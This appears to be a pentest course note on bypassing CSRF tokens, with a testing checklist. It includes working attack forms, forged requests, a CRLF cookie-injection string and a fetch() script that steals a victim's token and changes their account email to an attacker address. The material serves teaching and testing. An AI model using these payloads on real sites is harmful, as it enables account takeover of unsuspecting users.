# 11.05 — CSRF Token Bypass Techniques

## What is a CSRF Token?

A CSRF token is a random, secret, unpredictable value generated by the server. It's included in every form and validated on submission. Since the attacker can't read the victim's token (SOP prevents it), CSRF attacks fail — in theory.

```
HOW CSRF TOKENS WORK:
  1. Server generates random token (e.g., abc123xyz)
  2. Token included in form: <input name="csrf" value="abc123xyz">
  3. Also stored server-side: session['csrf'] = 'abc123xyz'
  4. On form submit: server checks if submitted token matches session token
  5. Attacker can't know abc123xyz → CSRF attack blocked!

WHERE TOKENS APPEAR:
  ✓ Hidden form fields: <input type="hidden" name="csrf_token" value="...">
  ✓ Request headers: X-CSRF-Token, X-Requested-With
  ✓ URL parameters: /action?csrf=TOKEN
  ✓ Cookies (double-submit pattern)
```

---

## Bypass 1 — Change Request Method to GET

```
IF: App validates CSRF token for POST but not GET
THEN: Simply change POST to GET!

BYPASS:
  Normal request (blocked):
  POST /change-email HTTP/1.1
  Content-Type: application/x-www-form-urlencoded
  
  email=evil@evil.com&csrf=TOKEN
  
  Bypassed request:
  GET /change-email?email=evil@evil.com HTTP/1.1
  (no CSRF token needed!)

HOW TO TEST IN BURP:
  1. Intercept the POST request
  2. Send to Repeater
  3. Change "POST" to "GET"
  4. Move body params to URL: ?email=evil@evil.com
  5. Delete the body
  6. Send → if it succeeds → BYPASS!
```

## Bypass 2 — Delete the CSRF Token Parameter

```
IF: App checks token only if present, skips check if absent
THEN: Just remove the token from the request!

NORMAL REQUEST:
  POST /change-email HTTP/1.1
  
  email=evil@evil.com&csrf_token=ABCD1234

BYPASS REQUEST:
  POST /change-email HTTP/1.1
  
  email=evil@evil.com
  (csrf_token removed entirely!)

ATTACK HTML:
  <form action="https://target.com/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <!-- Notice: NO csrf_token field! -->
  </form>
```

## Bypass 3 — Use Another User's CSRF Token

```
IF: Token validated only for format/existence, not tied to session
THEN: Use your OWN CSRF token in an attack against another user!

HOW TO TEST:
  1. Log in as attacker → get your own CSRF token
  2. Inspect your form: <input name="csrf" value="MY_TOKEN">
  3. Submit CSRF attack using MY_TOKEN
  4. If victim's request succeeds → BYPASS!

WHY IT WORKS:
  Bad implementation checks: "Is this a valid CSRF token?"
  Should check: "Is this MY CSRF token from MY session?"
  
  If tokens are in a global pool (not per-session), any valid token works!

ATTACK:
  <form action="https://target.com/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="csrf" value="ATTACKER_OWN_TOKEN">
  </form>
```

## Bypass 4 — CSRF Token Tied to Non-Session Cookie

```
IF: CSRF token tied to a separate cookie (not the session cookie)
THEN: If you can set cookies on the victim, you can bypass it!

HOW IT WORKS:
  Server sets: Set-Cookie: csrfKey=RANDOM123
  Form has: <input name="csrf" value="HASH(RANDOM123)">
  
  Validation: csrf param matches csrfKey cookie → accept!
  
BYPASS (if you can inject cookies via subdomain/open redirect):
  1. Create your own csrfKey cookie value
  2. Calculate corresponding form token
  3. Force victim to accept your csrfKey cookie
  4. Submit form with your token

COOKIE INJECTION VIA HEADER:
  If you can inject Set-Cookie via CRLF:
  GET /?search=test%0d%0aSet-Cookie:%20csrfKey=ATTACKER_KEY
  → Response: Set-Cookie: csrfKey=ATTACKER_KEY
  → Now victim has your csrfKey
  → Your CSRF token (matching ATTACKER_KEY) is valid for victim!
```

## Bypass 5 — CSRF Token in URL, Logged via Referer

```
IF: CSRF token is in URL (not body), and site logs URLs
THEN: Token leaks in Referer header!

EXAMPLE:
  GET /reset-password?csrf=ABC123 HTTP/1.1
  
  If this page has a link to an external site:
  User clicks link → browser sends:
  GET /external-page HTTP/1.1
  Referer: https://target.com/reset-password?csrf=ABC123
  
  → external-site.com receives: Referer contains CSRF token!
  → Attacker controls external-site.com → steals token!
```

---

## Bypass 6 — Referer Header Bypass

```
IF: App uses Referer header instead of CSRF token
THEN: Several bypass techniques exist!

TEST 1 — REMOVE REFERER (may pass if server accepts empty referer):
  <meta name="referrer" content="no-referrer">
  → Browser sends NO Referer header
  → If server only validates when header present → BYPASS!

TEST 2 — SUBDOMAIN TRICK (if server does includes() check):
  Host attack page at: https://target.com.evil.com/csrf.html
  → Referer: https://target.com.evil.com/csrf.html
  → If check: referer.includes('target.com') → TRUE! → BYPASS!

TEST 3 — URL PATH TRICK:
  Host at: https://evil.com/target.com/csrf.html
  → Referer: https://evil.com/target.com/csrf.html
  → If naive check → BYPASS!

BURP LAB SCENARIO:
  1. Normal CSRF PoC
  2. Add: <meta name="referrer" content="no-referrer">
  3. Submit → does it work without Referer?
```

## Bypass 7 — HTML5 Form Submission from Different Origin

```
IF: App has CORS misconfiguration that allows reading responses
THEN: Fetch the CSRF token, then use it!

STEP 1: FETCH CSRF TOKEN USING XHR/FETCH (requires CORS misconfig):
<script>
  fetch('https://target.com/account', {credentials: 'include'})
    .then(r => r.text())
    .then(html => {
      // parse CSRF token from HTML
      let match = html.match(/name="csrf" value="([^"]+)"/);
      let csrf = match[1];
      
      // use it!
      let form = new FormData();
      form.append('email', 'attacker@evil.com');
      form.append('csrf', csrf);
      
      fetch('https://target.com/change-email', {
        method: 'POST',
        credentials: 'include',
        body: form
      });
    });
</script>
```

## Quick Test Checklist

```
CSRF TOKEN BYPASS CHECKLIST:
  [ ] Change POST to GET, remove token
  [ ] Keep POST, delete token parameter entirely
  [ ] Use attacker's own token in victim's request
  [ ] Try empty string: csrf=
  [ ] Try all-zeros: csrf=0000000000000000
  [ ] Try static strings: csrf=null, csrf=undefined, csrf=test
  [ ] Check if token tied to session or global pool
  [ ] Test Referer header: remove it or spoof it
  [ ] Look for token in cookie (double-submit pattern)
  [ ] If token in URL → look for Referer leak to external domains
  [ ] Try uppercase/lowercase variation of token
  [ ] Check for predictable token patterns (PRNG weakness)
```
